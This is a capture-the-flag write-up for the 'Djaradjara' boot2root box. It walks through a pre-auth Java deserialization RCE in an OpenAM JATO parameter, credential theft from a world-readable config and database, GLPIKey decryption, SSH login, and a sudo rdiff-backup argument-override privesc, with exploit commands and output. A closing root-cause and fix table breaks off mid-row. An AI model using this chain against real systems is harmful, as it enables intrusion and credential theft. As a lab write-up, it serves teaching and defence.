---
title: "NCTF-boot2root : Djaradjara writeup"
date: 2026-11-21 00:00:00 +0000
categories: [pentest ,Boot2root]
tags: [Pentesting,cybersecurity]
---


# Djaradjara — writeup

Djaradjara boot2root box. Chain: **unauthenticated Java deserialization RCE →
leaked DB creds → GLPIKey decrypt → ssh → sudo rdiff-backup restrict-path page /
/read/root → root flag**.

Target: `http://<IP>:PORT/` , ssh `-p PORT`.

---

## 0. Recon

```bash
nmap -sV -sC $IP
# 22/tcp  open  ssh        OpenSSH ...
# 8080/tcp open  http-proxy (JATO impersonation / "OpenAM 16.0.5")
```

`http://10.10.20.40:PORT/openam/` renders a minimal "Welcome to OpenAM" page —
the box re-implements only the vulnerable JATO JSP layer.

---

## 1. Foothold — CVE-2026-33439 `jato.clientSession` deserialization

OpenAM deserializes the HTTP parameter `jato.clientSession` with a **bare
`ObjectInputStream`**, no class whitelist (`Encoder.deserialize` ←
`ClientSession.deserializeAttributes`). Any endpoint that renders a JATO
`<jato:form>` will trigger it — pre-auth.

The service serves the *same* gadget-chain artifacts the public exploit builds
against (openam-core/xalan/serializer/click JARs, vendored in `deploy/jars/`), so
the stock exploit runs unchanged:

```bash
python3 exploit_cve_2026_33439.py \
    --url http://127.0.0.1:PORT/openam \
    --command 'id' \
    --jars ../deploy/jars \
    --endpoint /ui/PWResetUserValidation \
    --method GET
```

Result — RCE as `openam`:

```
uid=999(openam) gid=999(openam) groups=999(openam)
```

**Why it works:** the chain is `PriorityQueue` → `Table$Column$ColumnComparator`
`compare()` → `PropertyUtils.getRowList()` (a `TemplatesImpl` masquerades as the
row list) → `outputProperties` → `TemplatesImpl.newTransformer()` compiles and
executes the embedded `EvilTranslet` (extends `AbstractTranslet`, code in its
constructor / static initializer). The translet is built client-side with
`--release 11`, so `TransletClassLoader` has no module-access problem on the
target JVM.

---

## 2. Lateral movement — leaked DB creds + GLPIKey decrypt

From the web shell (user `openam`):

```bash
# the GLPI-like config is world-readable
php -r 'require "/opt/djaradjara/glpi/config/config.php"; echo DBdjaradjara::$dbpassword, "\n";'
# 8rhu0L6Pw4Y7

# same story as the original box: the whole glpi config dir leaks
ls -la /opt/djaradjara/glpi/config/      # config.php, glpicrypt.key
ls -la /opt/djaradjara/glpi/src/         # glpikey.php (GLPIKey decrypt helper)
```

MySQL allows remote access via creds in `config.php`:

```bash
mysql -h127.0.0.1 -uglpi -p'8rhu0L6Pw4Y7' glpidb \
  -e "select name,value from glpi_configs;"

# +-------------+----------------------------------------------------+
# | name        | value                                              |
# +-------------+----------------------------------------------------+
# | owen_secret | DrjV+J0oRa/Y2E3TSyfY90IbzfhH2LSmmNCSDuVJxrkaOZS6... |
# +-------------+----------------------------------------------------+
```

Decrypt with the on-box helper (GLPIKey = AES-256-CBC, key =
`config/glpicrypt.key`, IV prepended):

```bash
php /opt/djaradjara/glpi/src/glpikey.php 'DrjV+J0oRa/Y2E3TSyfY90IbzfhH2LSmmNCSDuVJxrkaOZS6osQ3uYqfpQEQEzx3'
# Djar4Djar4_R00t_S3cret!
```

```bash
sshpass -p 'Djar4Djar4_R00t_S3cret!' ssh -p PORT owen@127.0.0.1
owen@djaradjara:~$ sudo -l
# (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

---

## 3. Privesc — sudo `rdiff-backup` restrict-path override → root flag

`rdiff-backup` (2.2.6) allows to pass additional arguments to the server binary.
`sudo` only checks the *prefix* regex: the command before the final `*` is fixed,
but `--restrict-path` can be repeated — the **last one wins**, disabling read-only
restriction on `/`.

```bash
rdiff-backup --remote-schema \
  'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s' \
  backup /::/root /tmp/rootbak

cat /tmp/rootbak/flag.txt
# NCTF{}
```

The client process runs `sudo rdiff-backup --server ... --restrict-path /::/root`
(permitted by the trailing `*`), so the server now resolves `/` — and any path
starting with it (`/root/flag.txt`) — as a valid "restricted" root.

---

## Root cause & fix

| Stage | Root cause | Fix |
|-------|-----------|-----|
| Foothold | `jato.clientSession` deserialized with a bare `ObjectInputStream` | class whitelist or signed sessions (the CVE-2021-35464 fix, applied to `jato.pageSession` only, must be applied to `jato.clientSession` too) |
| Lateral | world-readable app config + same password in a plaintext DB | per-service secrets, rotate, no cred reuse between DB and ssh |
| Privesc | `sudo` snippet ends in `*` and permits a duplicate `--restrict-path` | drop the trailing `*`; disallow repeated restrict options; use a non-overridable config 
